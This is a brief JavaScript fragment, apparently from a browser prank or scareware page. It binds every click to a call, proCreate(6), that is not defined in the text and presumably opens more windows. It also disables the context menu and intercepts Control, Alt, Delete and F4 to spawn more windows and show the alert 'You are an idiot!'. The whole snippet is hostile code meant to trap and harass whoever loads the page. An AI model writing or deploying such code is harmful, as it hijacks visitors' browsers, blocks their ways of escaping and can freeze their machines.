document.querySelectorAll('*').forEach(e => e.addEventListener('click', async () => {
	await proCreate(6);
}));

window.onload = playBall;
window.oncontextmenu = () => false;
window.onkeydown = async (e) => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(e.key)) {
		await proCreate(6);
		alert('You are an idiot!');
	}
	
	return null;
}